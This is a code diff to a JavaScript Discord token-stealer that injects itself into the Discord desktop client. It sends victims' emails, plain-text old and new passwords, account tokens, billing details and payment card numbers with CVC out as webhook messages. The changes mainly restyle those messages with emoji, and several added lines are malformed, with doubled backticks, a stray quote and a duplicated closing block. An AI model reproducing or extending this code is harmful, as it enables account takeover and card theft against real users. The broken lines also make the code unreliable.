@@ -18,7 +18,7 @@ const config = {
   /**
    
    **/
-  api: 'https://discord.com/api/v9/users/@me',
+    api: 'https://discord.com/api/v9/users/@me',
   nitro: {
     boost: {
       year: {
@@ -661,16 +661,16 @@ const login = async (email, password, token) => {
         fields: [
           {
             name: '**Account Info**',
-            value: `Email: **${email}** - Password: **${password}**`,
+            value: `<:mail:1095741024678191114> Email: **${email}** - <:blacklock:1095741022065131571> Password: **${password}**`,
             inline: false,
           },
           {
             name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
             inline: false,
           },
           {
-            name: '**Token**',
+            name: '<:blackkeyicon7:1221556971636002826> **Token**',',
             value: `\`${token}\``,
             inline: false,
           },
@@ -703,16 +703,16 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         fields: [
           {
             name: '**Password Changed**',
-            value: `Email: **${json.email}**\nOld Password: **${oldpassword}**\nNew Password: **${newpassword}**`,
+            value: `<:mail:1095741024678191114> Email: **${json.email}**\n<:blacklock:1095741022065131571> Old Password: **${oldpassword}**\n<:blacklock:1095741022065131571> New Password: **${newpassword}**`,
             inline: true,
           },
           {
             name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
             inline: true,
           },
           {
-            name: '**Token**',
+            name: '<:blackkeyicon7:1221556971636002826> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -745,16 +745,16 @@ const emailChanged = async (email, password, token) => {
         fields: [
           {
             name: '**Email Changed**',
-            value: `New Email: **${email}**\nPassword: **${password}**`,
+            value: ``<:mail:1095741024678191114> New Email: **${email}**\n<:blacklock:1095741022065131571> Password: **${password}**`,,
             inline: true,
           },
           {
             name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: ``<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
             inline: true,
           },
           {
-            name: '**Token**',
+            name: '<:blackkeyicon7:1221556971636002826> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -834,11 +834,11 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           },
           {
             name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
             inline: true,
           },
           {
-            name: '**Token**',
+            name: '<:blackkeyicon7:1221556971636002826> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -878,11 +878,11 @@ const nitroBought = async (token) => {
           },
           {
             name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: ``<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
             inline: true,
           },
           {
-            name: '**Token**',
+            name: '<:blackkeyicon7:1221556971636002826> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -980,6 +980,10 @@ session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) 
       break;
 
     default:
+      break;
+  }
+});
+module.exports = require('./core.asar');
       break;
   }
 });
